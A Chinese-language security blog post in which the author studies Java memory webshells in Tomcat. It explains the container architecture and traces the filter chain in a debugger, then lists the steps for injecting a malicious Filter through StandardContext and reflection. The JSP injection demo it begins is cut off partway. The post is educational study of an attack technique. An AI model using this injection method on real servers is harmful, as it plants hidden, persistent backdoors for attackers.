        <time datetime="2024-12-30T05:31:32.000Z" class="dt-published" itemprop="datePublished">2024-12-30</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/Java%E5%AE%89%E5%85%A8/">Java安全</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/" rel="tag">内存马</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p>开启一个补漏的篇章，内存只是听说过还从来没有细细学过。本篇就记录下自己学习java内存马的过程。</p>
<h2 id="1-前置基础">1.前置基础</h2>
<p>在开始学下之前我们先来了解什么是servlet容器，这里以tomcat为例。</p>
<p>web容器的概念参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/hzk1562110692/article/details/94295947">https://blog.csdn.net/hzk1562110692/article/details/94295947</a></p>
<p>tomcat原理参考：</p>
<p><a target="_blank" rel="noopener" href="https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09">https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09</a></p>
<p><a target="_blank" rel="noopener" href="https://tuonioooo-notebook.gitbook.io/performance-optimization/webrong-qi-you-hua/tomcatrong-qi-you-hua-pian/tomcatrong-qi-nei-bu-yuan-li">https://tuonioooo-notebook.gitbook.io/performance-optimization/webrong-qi-you-hua/tomcatrong-qi-you-hua-pian/tomcatrong-qi-nei-bu-yuan-li</a></p>
<p><a target="_blank" rel="noopener" href="https://maishuren.top/archives/tomcat-zhong-servlet-rong-qi-de-she-ji-yuan-li">https://maishuren.top/archives/tomcat-zhong-servlet-rong-qi-de-she-ji-yuan-li</a></p>
<p>这两篇文章大致介绍了请求 响应流程</p>
<p>tomcat源码调试参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/zhuiyisinian/article/details/105617138">https://blog.csdn.net/zhuiyisinian/article/details/105617138</a></p>
<p>这里参考<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13638">https://xz.aliyun.com/t/13638</a> 该文章以及tomacat原理参考中的第一篇文章详细记录下</p>
<p>我这里直接copy<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13638">https://xz.aliyun.com/t/13638</a> 这篇文章。但还是要结合上面tomcat参考的看一下更清楚流程。</p>
<p>Tomcat设计了四种容器，分别是Engine、Host、Context和Wrapper，其关系如下：<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714812004673-e793f486-f91c-4297-b7e7-8fdde01b71a9.png" alt=""></p>
<p>此时，设想这样一个场景：我们此时要访问<a target="_blank" rel="noopener" href="https://manage.xxx.com:8080/user/list%EF%BC%8C%E9%82%A3tomcat%E6%98%AF%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E8%AF%B7%E6%B1%82%E5%AE%9A%E4%BD%8D%E5%88%B0%E5%85%B7%E4%BD%93%E7%9A%84servlet%E7%9A%84%E5%91%A2%EF%BC%9F%E4%B8%BA%E6%AD%A4tomcat%E8%AE%BE%E8%AE%A1%E4%BA%86Mapper%EF%BC%8C%E5%85%B6%E4%B8%AD%E4%BF%9D%E5%AD%98%E4%BA%86%E5%AE%B9%E5%99%A8%E7%BB%84%E4%BB%B6%E4%B8%8E%E8%AE%BF%E9%97%AE%E8%B7%AF%E5%BE%84%E7%9A%84%E6%98%A0%E5%B0%84%E5%85%B3%E7%B3%BB%E3%80%82">https://manage.xxx.com:8080/user/list，那tomcat是如何实现请求定位到具体的servlet的呢？为此tomcat设计了Mapper，其中保存了容器组件与访问路径的映射关系。</a></p>
<p>然后就开始四步走：</p>
<ol>
<li>根据协议和端口号选定Service和Engine。我们知道Tomcat的每个连接器都监听不同的端口，比如Tomcat默认的HTTP连接器监听8080端口、默认的AJP连接器监听8009端口。上面例子中的URL访问的是8080端口，因此这个请求会被HTTP连接器接收，而一个连接器是属于一个Service组件的，这样Service组件就确定了。我们还知道一个Service组件里除了有多个连接器，还有一个容器组件，具体来说就是一个Engine容器，因此Service确定了也就意味着Engine也确定了。</li>
<li>根据域名选定Host。Service和Engine确定后，Mapper组件通过url中的域名去查找相应的Host容器，<a target="_blank" rel="noopener" href="http://xn--urlmanage-pl6nj4j1rsi7lprfbxhoy2cubuh57bda3189hhyzb.xxx.com">比如例子中的url访问的域名是manage.xxx.com</a>，因此Mapper会找到Host1这个容器。</li>
<li>根据url路径找到Context组件。Host确定以后，Mapper根据url的路径来匹配相应的Web应用的路径，比如例子中访问的是/user，因此找到了Context1这个Context容器。</li>
<li>根据url路径找到Wrapper（Servlet）。Context确定后，Mapper再根据web.xml中配置的Servlet映射路径来找到具体的Wrapper和Servlet，例如这里的Wrapper1的/list。</li>
</ol>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714813938267-fbd3b097-e9fd-4279-bae3-af15bf6b2625.png" alt=""></p>
<p>以上是参考别人的，下面用自己的话简单概括一下：</p>
<p>就是说连接器负责监听外界的请求然后将请求封装成servlet对象发送给engine在由engin的Mapper根据url等信息去调用context在去调用wrapper再去调用具体servlet</p>
<h2 id="2-传统内存马">2.传统内存马</h2>
<h3 id="2-1Filter-内存马">2.1Filter 内存马</h3>
<p>filter 也称之为过滤器，是对 Servlet 技术的一个强补充，其主要功能是在 HttpServletRequest 到达 Servlet 之前，拦截客户的 HttpServletRequest ，根据需要检查 HttpServletRequest，也可以修改 HttpServletRequest 头和数据；在 HttpServletResponse 到达客户端之前，拦截 HttpServletResponse ，根据需要检查 HttpServletResponse，也可以修改 HttpServletResponse 头和数据。</p>
<p>工作原理如图所示：</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714821706305-574612a8-d1bc-4d2e-88dc-a08789fa38db.png" alt=""></p>
<p>在调试分析之前还是说一句能尽量看看tomact的源码分析就多看看。</p>
<p>首先看一下filter内存马用的主要几个方法：</p>
<ul>
<li>FilterDefs：存放FilterDef的数组 ，FilterDef 中存储着我们过滤器名，过滤器实例，作用 url 等基本信息</li>
<li>FilterConfigs：存放filterConfig的数组，在 FilterConfig 中主要存放 FilterDef 和 Filter对象等信息</li>
<li>FilterMaps：存放FilterMap的数组，在 FilterMap 中主要存放了 FilterName 和 对应的URLPattern</li>
<li>FilterChain：过滤器链，该对象上的 doFilter 方法能依次调用链上的 Filter</li>
<li>WebXml：存放 web.xml 中内容的类</li>
<li>ContextConfig：Web应用的上下文配置类</li>
<li>StandardContext：Context接口的标准实现类，一个 Context 代表一个 Web 应用，其下可以包含多个 Wrapper</li>
<li>StandardWrapperValve：一个 Wrapper 的标准实现类，一个 Wrapper 代表一个Servlet</li>
</ul>
<p>下面我们写一个filter的demo看一下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.tomcat_demo_neicunma;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter()</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">filterdemo</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        Filter.<span class="built_in">super</span>.init(filterConfig);</span><br><span class="line">        System.out.println(<span class="string">&quot;init&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;diaoyong filter&quot;</span>);</span><br><span class="line">        chain.doFilter(request,response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        Filter.<span class="built_in">super</span>.destroy();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在配置一下web.xml文件</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--过滤器配置--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.example.tomcat_demo_neicunma.filterdemo<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/test<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="2-1-1访问filter之后的调用">2.1.1访问filter之后的调用</h4>
<p>然后我们直接打一个断点在dofilter中</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715917345344-c615db5b-5552-46c8-b904-82c3c661b110.png" alt=""></p>
<p>开启调试，这里推荐看tomcat的分析，可以很详细的了解清楚在filter之后流程调用是怎么运行的。</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715917494259-a9cd4aba-ea46-4903-a647-f67f2bf94f25.png" alt=""></p>
<p>这里我们自己跟跟跟进filter会进入ApplicationFilterChain类里的dofilter方法这里的Globals.IS_SECURITY_ENABLED，也就是全局安全服务是否开启的判断。</p>
<p>我们继续跟他会调用else里面的internalDoFilter方法跟进去看看</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715917709111-550f931f-688f-4522-a9dd-c8350153b017.png" alt=""></p>
<p>主要是要看一下这个filters</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715917971557-6099595a-2995-45aa-8a8f-c5810d4b8060.png" alt=""></p>
<p>这里这个filters主要是用来存储我们自定义的filter对象和tomcat自带的filter的。</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715918131371-6d827c6e-0ff0-4325-ae1a-14e6341be117.png" alt=""></p>
<p>继续往下跟进发下获取出数组里的filter 然后调用filter的dofilter方法。然后我们在继续跟进的时候发现又会调用到ApplicationFilterChain类里的dofilter方法，这里可以去网上查一查具体我就不在继续跟了，自己解释一下就是filter是一条链会一个个获取filter然后执行filter里面dofilter方法直到最后一个</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715918429489-5ad797a6-55ef-4262-87ea-642724d5b8ec.png" alt=""></p>
<p>最后会调用到这里去调用servlet。</p>
<p>:::tips<br>
最后一个 filter 调用 servlet 的 service 方法</p>
<p>上一个 Filter.doFilter() 方法中调用 FilterChain.doFilter() 方法将调用下一个 Filter.doFilter() 方法；这也就是我们的 Filter 链，是去逐个获取的。</p>
<p>最后一个 Filter.doFilter() 方法中调用的 FilterChain.doFilter() 方法将调用目标 Servlet.service() 方法。</p>
<p>只要 Filter 链中任意一个 Filter 没有调用 FilterChain.doFilter() 方法，则目标 Servlet.service() 方法都不会被执行。</p>
<p>至此，我们的正向分析过程就结束了，得到的结论是 Filter Chain 的调用结构是一个个 doFilter() 的，最后一个 Filter 会调用 Servlet.service()</p>
<p>:::</p>
<p>这里参考：<a target="_blank" rel="noopener" href="https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/#%E5%9C%A8%E8%AE%BF%E9%97%AE-x2F-filter-%E4%B9%8B%E5%90%8E%E7%9A%84%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90">https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/#%E5%9C%A8%E8%AE%BF%E9%97%AE-x2F-filter-%E4%B9%8B%E5%90%8E%E7%9A%84%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90</a>这个文章的解释</p>
<h4 id="2-1-2访问filter之前的调用">2.1.2访问filter之前的调用</h4>
<p>还是同样的我们直接在自定义的dofilter方法里下一个断点然后看看是谁调用了该方法</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715927482149-3028d7cf-1a48-428b-b3d2-3808f25bc1df.png" alt=""></p>
<p>通过idea的调用栈以及参考网上的分析可以看到是ApplicationFilterChain的internalDoFilter方法中调用了我们自定义的filter方法，然后继续向上寻找发现是ApplicationFilterChain下的doFilter调用了该方法，再接着向上寻找调用栈发现StandardWrapperValve类里面的invoke方法中的filterchain调用了doFilter方法<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715927708397-b995071b-016d-45ab-bba9-59a7eeb08821.png" alt=""></p>
<p>那我们继续看这个filterChain是什么</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715927790744-70dd872e-e8ea-4926-b082-ac6e10378545.png" alt=""></p>
<p>往上翻可以看到是ApplicationFilterChain调用了createFilterChain方法复值给 filterchain跟进这个方法看看</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715928219779-74b1503a-3823-4298-8921-2513e2bc93c0.png" alt=""></p>
<p>下面比较重要的就是箭头所指出的两个方法，获取filterMaps（filterMap 主要存放了过滤器的名字以及作用的</p>
<p>url）如下图所示</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715928697066-2bdcfe9c-ac70-48eb-9541-82afdd287bda.png" alt=""></p>
<p>然后有一个判断如果我们没有编写filter方法也就是没在web.xml文件中配置filter对象、路径等等之类的，就直接返回filterchain对象去调用后面的servlet。</p>
<p>如果不为空的话就遍历 FilterMaps 中的 FilterMap，如果发现符合当前请求 url 与 FilterMap 中的 urlPattern 想匹配，就会进入 if 判断会调用 findFilterConfig 方法在 filterConfigs 中寻找对应 filterName名称的FilterConfig，然后如果不为null，就进入 if 判断，将 filterConfig 添加到 filterChain中，看一下filterconfig数组属性包含filterdef、filter等</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715929629775-79499f1a-8dbd-4489-a920-8334b459c638.png" alt=""></p>
<p>跟进addFilter函数</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715929050800-9193fcf4-8ada-47a0-a15e-6546a5f7dfe1.png" alt=""></p>
<p>在addFilter函数中首先会遍历filters，判断我们的filter是否已经存在（其实就是去重）</p>
<p>下面这个 if 判断其实就是扩容，如果 n 已经等于当前 filters 的长度了就再添加10个容量，最后将我们的filterConfig 添加到 filters中</p>
<p>到这里其实就是相当于跟完了filter的整个调用链。来一张经典图</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715929580462-30056289-bc45-487f-812c-711f5bf1841e.png" alt=""></p>
<p>通过上面的思考我们能够想到如果我们想要插入一个内存马的关键点就在于StandardContext.findFilterMaps()和StandardContext.findFilterConfig()，我们可以来看看这2个方法的实现，可以看到都是直接从StandardContext中取到对应的属性，那么我们只要往这2个属性里面插入对应的filterMap和filterConfig即可实现动态添加filter的目的:</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715929736823-1afa3139-43d7-4ca1-915f-51a858d9a758.png" alt=""><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715929765876-047ada2d-7513-4fca-98e0-392259120db5.png" alt=""></p>
<p>实际上StandardContext也有一些方法可以帮助我们添加属性。首先我们来看filtermaps，StandardContext直接提供了对应的添加方法(Before是将filter放在首位，正是我们需要的)，</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715932382974-a7004554-d8c8-47f2-96de-82d6e91534f9.png" alt=""></p>
<p>这里再往filterMaps添加之前会有一个校验filtermap是否合法的操作，跟进validateFilterMap.</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715932487587-2eb1b420-300c-41ba-b9fa-1620ece24326.png" alt=""></p>
<p>红色箭头所指的地方可以看到调用了findFilterDef方法闯入filtername跟进去看看</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715932592404-eacd9c7b-a606-48a0-b606-068f710f604a.png" alt=""></p>
<p>可以看到会根据filtename去寻找对应的filterdef如果没找到为空的话会报异常错误，所以我们除了往filterMap和filterConfig添加filter以外还向filterdef中添加filter的相关属性不过StandardContext直接提供了对应的添加方法:</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715932861209-3a0794fd-9fc4-4759-ad13-f59bd17d1afa.png" alt=""></p>
<p>最后我们再来看filterConfigs，根据命名规则搜索addFilterConfig，发现并没有这个方法，所以我们考虑要通过反射的方法手动获取属性并添加:<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715934494968-409c996f-6aec-468b-9196-3739b46963e3.png" alt=""></p>
<p>:::tips<br>
这里做一个简单的总结：</p>
<p>1.根据请求的 URL 从 FilterMaps 中找出与之 URL 对应的 Filter 名称</p>
<p>2.根据 Filter 名称去 FilterConfigs 中寻找对应名称的 FilterConfig</p>
<p>3.找到对应的 FilterConfig 之后添加到 FilterChain中，并且返回 FilterChain</p>
<p>4.filterChain 中调用 internalDoFilter 遍历获取 chain 中的 FilterConfig ，然后从 FilterConfig 中获取 Filter，然后调用 Filter 的 doFilter 方法</p>
<p>根据上面的简单总结，不难发现最开始是从 context 中获取的 FilterMaps，将符合条件的依次按照顺序进行调用，那么我们可以将自己创建的一个 FilterMap 然后将其放在 FilterMaps 的最前面，这样当 urlpattern 匹配的时候就回去找到对应 FilterName 的 FilterConfig ，然后添加到 FilterChain 中，最终触发我们的内存shell</p>
<p>:::</p>
<p>参考：<a target="_blank" rel="noopener" href="http://wjlshare.com/archives/1529">http://wjlshare.com/archives/1529</a></p>
<h4 id="2-1-3关于StandardContext、ApplicationContext、ServletContext">2.1.3关于StandardContext、ApplicationContext、ServletContext</h4>
<p>:::tips<br>
通过上面总结及分析发现我们想要注入filter内存马需要获取standardcontex对象才能调用其中的方法进行注入。</p>
<p>这里直接复制别的师傅</p>
<p>关于StandardContext、ApplicationContext、ServletContext的理解</p>
<p>请参考Skay师傅和yzddmr6师傅的文章，他们写的非常详细，这里直接贴出链接：</p>
<p><a target="_blank" rel="noopener" href="https://yzddmr6.com/posts/tomcat-context/">https://yzddmr6.com/posts/tomcat-context/</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/BrbkTiCuX4lNEir3y24lew">https://mp.weixin.qq.com/s/BrbkTiCuX4lNEir3y24lew</a></p>
<p>引用Skay师傅的一句话总结：</p>
<p>ServletContext是Servlet规范；org.apache.catalina.core.ApplicationContext是ServletContext的实现；org.apache.catalina.Context接口是tomcat容器结构中的一种容器，代表的是一个web应用程序，是tomcat独有的，其标准实现是org.apache.catalina.core.StandardContext，是tomcat容器的重要组成部分。</p>
<p>关于StandardContext的获取方法，除了本文中提到的将我们的ServletContext转为StandardContext从而获取context这个方法，还有以下两种方法：</p>
<p>从线程中获取StandardContext，参考Litch1师傅的文章：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/O9Qy0xMen8ufc3ecC33z6A">https://mp.weixin.qq.com/s/O9Qy0xMen8ufc3ecC33z6A</a></p>
<p>从MBean中获取，参考54simo师傅的文章：<a target="_blank" rel="noopener" href="https://scriptboy.cn/p/tomcat-filter-inject/">https://scriptboy.cn/p/tomcat-filter-inject/</a>，不过这位师傅的博客已经关闭了，我们可以看存档：<a target="_blank" rel="noopener" href="https://web.archive.org/web/20211027223514/https://scriptboy.cn/p/tomcat-filter-inject/">https://web.archive.org/web/20211027223514/https://scriptboy.cn/p/tomcat-filter-inject/</a></p>
<p>从spring运行时的上下文中获取，参考 LandGrey@奇安信观星实验室 师傅的文章：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/198886">https://www.anquanke.com/post/id/198886</a></p>
<p>:::</p>
<h5 id="2-1-3-1编写demo">2.1.3.1编写demo</h5>
<p>:::tips<br>
如果我们想要写一个Filter内存马，需要经过以下步骤：</p>
<p>参考：<a target="_blank" rel="noopener" href="https://longlone.top/">https://longlone.top/</a>安全/java/java安全/内存马/Tomcat-Filter型/</p>
<p>获取StandardContext；</p>
<p>继承并编写一个恶意filter；</p>
<p>实例化一个FilterDef类，包装filter并存放到StandardContext.filterDefs中；</p>
<p>实例化一个FilterMap类，将我们的Filter和urlpattern相对应，使用addFilterMapBefore存放到StandardContext.filterMaps中；</p>
<p>通过反射获取filterConfigs，实例化一个FilterConfig（ApplicationFilterConfig）类，传入StandardContext与filterDefs，存放到filterConfig中。</p>
<p>参考：<a target="_blank" rel="noopener" href="https://tyaoo.github.io/2021/12/06/Tomcat">https://tyaoo.github.io/2021/12/06/Tomcat</a>内存马/</p>
<p>需要注意的是，一定要先修改filterDef，再修改filterMap，不然会抛出找不到filterName的异常。</p>
<p>:::</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.List&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.ArrayList&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    filterConfigsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) filterConfigsField.get(standardContext);</span><br><span class="line">    <span 